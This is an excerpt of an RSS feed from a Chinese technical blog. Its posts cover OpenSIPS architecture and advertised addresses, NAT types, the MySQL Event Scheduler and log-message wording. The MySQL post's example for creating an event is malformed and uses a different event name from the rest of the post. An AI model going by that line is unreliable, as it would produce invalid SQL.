&lt;/ul&gt;
&lt;h1 id=&#34;值得关注的人&#34;&gt;值得关注的人&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/muaz-khan&#34;&gt;https://github.com/muaz-khan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/chadwallacehart&#34;&gt;https://github.com/chadwallacehart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/fippo&#34;&gt;https://github.com/fippo&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;webrtc主题&#34;&gt;WebRTC主题&lt;/h1&gt;
&lt;p&gt;github上webrtc主题相关的仓库，干货非常多 &lt;a href=&#34;https://github.com/topics/webrtc&#34;&gt;https://github.com/topics/webrtc&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>opensips介绍</title>
      <link>https://wdd.js.org/opensips/ch3/about-opensips/</link>
      <pubDate>Tue, 19 Nov 2019 18:37:40 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch3/about-opensips/</guid>
      <description>&lt;h1 id=&#34;1-opensips架构&#34;&gt;1. OpenSIPS架构&lt;/h1&gt;
&lt;p&gt;OpenSIPS主要有两部分构成，&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;core: 提供底层工具、接口、资源&lt;/li&gt;
&lt;li&gt;module：模块是一些共享的库，在启动时按需加载。有些模块是用于在opensips脚本中提供功能，而有些模块是作为底层，为其他模块提供功能。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/ch3/about-opensips/2022-11-30-21-23-26.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-opensip-核心&#34;&gt;2. OpenSIP 核心&lt;/h1&gt;
&lt;h2 id=&#34;21-传输层&#34;&gt;2.1. 传输层&lt;/h2&gt;
&lt;p&gt;传输层提供了对于各种协议的支持，如TCP、UDP、TLS、WebSocket&lt;/p&gt;
&lt;h2 id=&#34;22-sip工厂层&#34;&gt;2.2. SIP工厂层&lt;/h2&gt;
&lt;p&gt;SIP工厂层提供了对SIP协议的解析和构建。OpenSIPS实现了一种懒解析功能，懒解析的效率非常高。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;懒解析&lt;/strong&gt;：懒解析就是只去解析SIP头，并不解析SIP头的字段内容。而是在需要读取头字段内容时，才去解析。所以可以理解为按需解析。有点类似于一些文件系统的写时复制功能。&lt;/p&gt;
&lt;p&gt;**惰性应用：**有一点非常重要，当你通过脚本提供的函数去改变SIP消息时，所作出的改变并不是实时作用到SIP消息上，而是在先存起来，而是当所有的SIP消息处理完成后才会去应用这些改变。举例来说，你首先通过函数给SIP消息添加了某个头，然后你通过函数去获取这个头的时，发现这个头并不存在，但是SIP消息再发送出去后，又携带了你添加的这个头。&lt;/p&gt;
&lt;h2 id=&#34;23-路由脚本解析与执行&#34;&gt;2.3. 路由脚本解析与执行&lt;/h2&gt;
&lt;p&gt;OpenSIPS在启动后，会将opensips.cfg解析并加载到内存中。一旦OpenSIPS正常运行了，opensips.cfg文件即使删了也不会影响到OpenSIPS的运行了。&lt;/p&gt;
&lt;p&gt;但是OpenSIPS并不支持热脚本更新，如果你改了脚本，让让运行的OpenSIPS具有添加的功能，那么必须将OpensSIPS重启。&lt;/p&gt;
&lt;p&gt;OpenSIPS的脚本有点类似于C或者Shell语言，如果你Shell写的很溜，OpenSIPS的脚本理解起来也会非常容易。&lt;/p&gt;
&lt;h2 id=&#34;24-内存与锁管理&#34;&gt;2.4. 内存与锁管理&lt;/h2&gt;
&lt;p&gt;出于性能考虑，OpenSIPS自己内部实现了内存和锁的管理，这部分在内容在脚本中是不可见的。&lt;/p&gt;
&lt;h2 id=&#34;25-脚本变量和脚本函数&#34;&gt;2.5. 脚本变量和脚本函数&lt;/h2&gt;
&lt;p&gt;OpenSIPS核心提供的脚本变量和函数比较有限，外围的模块提供和很多的变量和函数。这些变量和函数的存在，都是为了让你易于获取SIP消息的某些字段，或者对SIP消息进行修改。&lt;/p&gt;
&lt;h2 id=&#34;26-sql接口类&#34;&gt;2.6. SQL接口类&lt;/h2&gt;
&lt;p&gt;OpenSIPS 核心实现了接口的定义，但是并没有实现接口。接口的实现由外部的模块提供，这样做的函数可以使用不同的数据库。&lt;/p&gt;
&lt;h2 id=&#34;27-mi管理接口&#34;&gt;2.7. MI管理接口&lt;/h2&gt;
&lt;p&gt;mi接口用来管理OpenSIPS, 可以实现以下功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;向OpenSIPS 发送数据&lt;/li&gt;
&lt;li&gt;从OpenSIPS 获取数据&lt;/li&gt;
&lt;li&gt;触发OpenSIPS 的内部行为&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Mysql计划任务：Event Scheduler</title>
      <link>https://wdd.js.org/posts/2019/11/xss1vk/</link>
      <pubDate>Wed, 13 Nov 2019 13:09:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/xss1vk/</guid>
      <description>&lt;p&gt;从MySql5.1.6增加计划任务功能&lt;/p&gt;
&lt;h1 id=&#34;判断计划任务是否启动&#34;&gt;判断计划任务是否启动&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SHOW&lt;/span&gt; VARIABLES &lt;span style=&#34;color:#66d9ef&#34;&gt;LIKE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;event_scheduler&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;开启计划任务&#34;&gt;开启计划任务&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;set&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; event_scheduler&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;创建计划任务&#34;&gt;创建计划任务&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;create&lt;/span&gt; test_e &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt; scheduler &lt;span style=&#34;color:#66d9ef&#34;&gt;every&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;day&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sql&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;修改计划任务&#34;&gt;修改计划任务&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;临时关闭事件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ALTER&lt;/span&gt; EVENT e_test DISABLE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;开启事件&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ALTER&lt;/span&gt; EVENT e_test ENABLE;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;将每天清空&lt;/span&gt;test表改为5天清空一次
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ALTER&lt;/span&gt; EVENT e_test &lt;span style=&#34;color:#66d9ef&#34;&gt;ON&lt;/span&gt; SCHEDULE &lt;span style=&#34;color:#66d9ef&#34;&gt;EVERY&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;DAY&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;删除计划任务&#34;&gt;删除计划任务&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;drop&lt;/span&gt; event e_test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>深入NAT网络</title>
      <link>https://wdd.js.org/opensips/ch1/deep-in-nat/</link>
      <pubDate>Tue, 05 Nov 2019 16:29:43 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/deep-in-nat/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;NAT的产生原因是IPv4的地址不够用，网络中的部分主机只能公用一个外网IP。&lt;/li&gt;
&lt;li&gt;NAT工作在网络层和传输层，主要是对IP地址和端口号的改变&lt;/li&gt;
&lt;li&gt;NAT的优点
&lt;ul&gt;
&lt;li&gt;节约公网IP&lt;/li&gt;
&lt;li&gt;安全性更好，所有流量都需要经过入口的防火墙&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;NAT的缺点
&lt;ul&gt;
&lt;li&gt;对于UPD应用不够友好&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;nat-工作原理&#34;&gt;NAT 工作原理&lt;/h1&gt;
&lt;p&gt;内部的设备X, 经过NAT设备后，NAT设备会改写源IP和端口&lt;!-- raw HTML omitted --&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/png/280451/1572943077192-78f4530d-9bfc-4e9f-a488-6ee447e577a5.png#align=left&amp;display=inline&amp;height=334&amp;name=image.png&amp;originHeight=844&amp;originWidth=1432&amp;size=201086&amp;status=done&amp;style=none&amp;width=566&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;nat-类型&#34;&gt;NAT 类型&lt;/h1&gt;
&lt;h2 id=&#34;1-全锥型&#34;&gt;1. 全锥型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;每个内部主机都有一个静态绑定的外部ip:port&lt;/li&gt;
&lt;li&gt;任何主机发往NAT设备上特定ip:port的包，都会被转发给绑定的主机&lt;/li&gt;
&lt;li&gt;这种方式的缺点很明显，黑客可以使用端口扫描工具，扫描出暴露的端口，然后通过这个端口攻击内部主机&lt;/li&gt;
&lt;li&gt;在内部主机没有往外发送流量时，外部流量也能够进入内部主机&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/png/280451/1572943413440-135a57b9-6517-4cdd-a1b4-56c59273cd57.png#align=left&amp;display=inline&amp;height=311&amp;name=image.png&amp;originHeight=622&amp;originWidth=1196&amp;size=141988&amp;status=done&amp;style=none&amp;width=598&#34;&gt;-&lt;/p&gt;
&lt;h2 id=&#34;2-限制锥形&#34;&gt;2. 限制锥形&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;NAT上的ip:port与内部主机是动态绑定的&lt;/li&gt;
&lt;li&gt;如果内部主机没有向某个主机先发送过包，那么NAT会拒绝外部主机进入的流量&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/png/280451/1572943838117-6fd712bd-a649-48b1-a03a-41f05c0d2759.png#align=left&amp;display=inline&amp;height=304&amp;name=image.png&amp;originHeight=608&amp;originWidth=1188&amp;size=153067&amp;status=done&amp;style=none&amp;width=594&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-端口限制型&#34;&gt;3. 端口限制型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;端口限制型除了有限制锥型的要求外，还增加了端口的限制&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/png/280451/1572943950482-37299fa8-7161-4b2e-9dd4-fdbb3e4f7bd6.png#align=left&amp;display=inline&amp;height=280&amp;name=image.png&amp;originHeight=656&amp;originWidth=1386&amp;size=151799&amp;status=done&amp;style=none&amp;width=591&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;4-对称型&#34;&gt;4. 对称型&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;对称型最难穿透，因为每次交互NAT都会使用不同的端口号，所以内外网端口映射根本无法预测&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt=&#34;image.png&#34; loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/png/280451/1572944115984-952ed90f-0f42-480a-8c9a-0f8f0c49fc0f.png#align=left&amp;display=inline&amp;height=304&amp;name=image.png&amp;originHeight=608&amp;originWidth=1192&amp;size=129426&amp;status=done&amp;style=none&amp;width=596&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;nat对比表格&#34;&gt;NAT对比表格&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;NAT类型&lt;/th&gt;
          &lt;th&gt;收数据前是否需要先发送数据&lt;/th&gt;
          &lt;th&gt;是否能够预测下一次的NAT打开的端口对&lt;/th&gt;
          &lt;th&gt;是否限制包的目的ip:port&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;全锥形&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;限制锥形&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;仅限制IP&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;端口限制型&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;对称型&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
          &lt;td&gt;否&lt;/td&gt;
          &lt;td&gt;是&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>【必读】深入对外公布地址</title>
      <link>https://wdd.js.org/opensips/ch5/adv-address/</link>
      <pubDate>Mon, 04 Nov 2019 13:11:30 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch5/adv-address/</guid>
      <description>&lt;p&gt;如果你仅仅是本地运行OpenSIPS, 你可以不用管什么对外公布地址。但是如果你的SIP服务器想在公网环境提供服务，则必然要深刻的理解对外公布地址。&lt;/p&gt;
&lt;p&gt;在一个集群中，可能有多台SIP服务器，例如如下图的网络架构中&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;register 负责注册相关的业务 192.168.1.100(内网)&lt;/li&gt;
&lt;li&gt;uas 负责呼叫相关的业务 192.168.1.101(内网)&lt;/li&gt;
&lt;li&gt;entry 负责接入 192.168.1.102(内网)，1.2.3.4(公网地址)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一般情况下，register和uas只有内外地址，没有公网地址。而entry既有内网地址，也有公网地址。公网地址一般是由云服务提供商分配的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/__graphviz/a6627f4c47acb6b0870a87628b91cf95.svg#lake_card_v2=eyJ0eXBlIjoiZ3JhcGh2aXoiLCJjb2RlIjoiZ3JhcGgge1xuXHRyYW5rZGlyPVwiTFJcIlxuXHQgc3ViZ3JhcGggY2x1c3Rlcl8yIHtcbiAgICBsYWJlbD1cIuWGhemDqOe9kee7nFwiO1xuICAgIGJnY29sb3I9XCJtaW50Y3JlYW1cIjtcblx0XHRcInJlZ2lzdGVyXCIgLS0gXCJlbnRyeVwiXG5cdCAgXCJ1YXNcIiAtLSBcImVudHJ5XCJcbiAgfVxuXHRcblx0XCJlbnRyeVwiIC0tIFwi5LqS6IGU572RXCJcblx0XCLkupLogZTnvZFcIiAtLSBcIuWIhuaculwiXG59IiwidXJsIjoiaHR0cHM6Ly9jZG4ubmxhcmsuY29tL3l1cXVlL19fZ3JhcGh2aXovYTY2MjdmNGM0N2FjYjZiMDg3MGE4NzYyOGI5MWNmOTUuc3ZnIiwiaWQiOiJHVWZpRiIsImhlaWdodCI6MzQ1LCJjYXJkIjoiZGlhZ3JhbSJ9&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们希望内部网络register和uas以及entry必须使用内网通信，而entry和互联网使用公网通信。&lt;/p&gt;
&lt;p&gt;有时候经常遇到的问题就是某个请求，例如INVITE, uas从内网地址发送到了entry的公网地址上，这时候就可能产生一些列的奇葩问题。&lt;/p&gt;
&lt;h1 id=&#34;如何设置公布地址&#34;&gt;如何设置公布地址&lt;/h1&gt;
&lt;h2 id=&#34;listen-as&#34;&gt;listen as&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;listen = udp:192.168.1.102:5060 as 1.2.3.4:5060
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在listen 的参数上直接配置公布地址。好处的方便，后续如果调用record_route()或者add_path_received(), OpenSIPS会自动帮你选择对外公布地址。&lt;/p&gt;
&lt;p&gt;但是，OpenSIPS选择可能并不是我们想要的。&lt;/p&gt;
&lt;p&gt;例如： INVITE请求从内部发送到互联网，这时OpenSIPS能正常设置对外公布地址。但是如果请求从外表进入内部，OpenSIPS可能还是会用公网地址作为对外公布地址。&lt;/p&gt;
&lt;p&gt;所以，listen as虽然方便，但不够灵活。&lt;/p&gt;
&lt;h2 id=&#34;set_advertised_address-和-set_advertised_portint&#34;&gt;set_advertised_address() 和 set_advertised_port(int)&lt;/h2&gt;
&lt;p&gt;set_advertised_address和set_advertised_port属于OpenSIPS和核心函数部分，可以在脚本里根据不同条件，灵活的设置公布地址。&lt;/p&gt;
&lt;p&gt;例如:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if 请求发生到公网 {
	set_advertised_address(&amp;#34;1.2.3.4&amp;#34;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;⚠️ 如果你选择用set_advertised_address和set_advertised_port来手动设置，就千万不要用as了。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h4 id=&#34;heading&#34;&gt;&lt;/h4&gt;
&lt;h1 id=&#34;几个注意点sip头&#34;&gt;几个注意点SIP头&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;record_route头&lt;/li&gt;
&lt;li&gt;Path头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面的两个头，在OpenSIPS里可以用下面的函数去设置。设置的时候，务必要主义选择合适的网络地址。否者请求将会不回按照你期望方式发送。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;record_route&lt;/li&gt;
&lt;li&gt;record_route_preset&lt;/li&gt;
&lt;li&gt;add_path&lt;/li&gt;
&lt;li&gt;add_path_received&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>打印易于提取关键词的日志</title>
      <link>https://wdd.js.org/posts/2019/11/xa694b/</link>
      <pubDate>Fri, 01 Nov 2019 09:30:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/xa694b/</guid>
      <description>&lt;p&gt;下面的日志是打印出socket.io断开的信息&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// bad
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`socket.io &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;handshake&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;agentId&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; disconnect. reason: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reason&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;但是这条日志不利于关键词搜索，如果搜disconnect，那么可能很多地方都有这个关键词。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// good
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`socket.io disconnect &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;handshake&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;agentId&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; reason: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reason&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// bad
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;logger&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`socket.io &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;handshake&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;agentId&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; disconnect. reason: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;reason&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总结经验&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;多个关键词位置要靠前&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多个关键词要集中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;日志日志要标记来自特殊的用于，比如说，来自&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Linux私房菜</title>
      <link>https://wdd.js.org/posts/2019/11/qy6ugu/</link>
      <pubDate>Fri, 01 Nov 2019 08:06:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/11/qy6ugu/</guid>
